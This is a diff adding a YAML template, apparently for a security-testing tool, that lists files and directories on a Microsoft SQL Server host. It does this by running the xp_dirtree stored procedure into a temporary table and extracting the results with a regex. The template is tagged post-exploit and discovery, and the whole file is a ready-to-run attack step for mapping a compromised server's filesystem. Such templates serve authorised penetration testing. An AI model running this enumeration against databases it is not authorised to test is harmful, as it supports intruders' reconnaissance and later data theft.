@@ -1,0 +1,21 @@
+id: mssql-file-enum
+service: [mssql]
+variables:
+  target_path: C:\
+info:
+  name: MSSQL File and Directory Enumeration
+  severity: medium
+  tags: mssql,post-exploit,discovery,filesystem
+
+services:
+  - ops:
+      - db: "CREATE TABLE #zombie_dirs (subdirectory VARCHAR(512), depth INT, is_file INT)"
+      - db: "INSERT INTO #zombie_dirs EXEC xp_dirtree '{{target_path}}', 1, 1"
+      - db: "SELECT 'entry=' + subdirectory + ':' + CAST(is_file AS varchar(1)) FROM #zombie_dirs ORDER BY is_file, subdirectory"
+        name: entries
+      - db: "DROP TABLE #zombie_dirs"
+    extractors:
+      - type: regex
+        name: mssql_dir_entries
+        part: entries
+        regex: ['(?m)^entry=(.+)$']
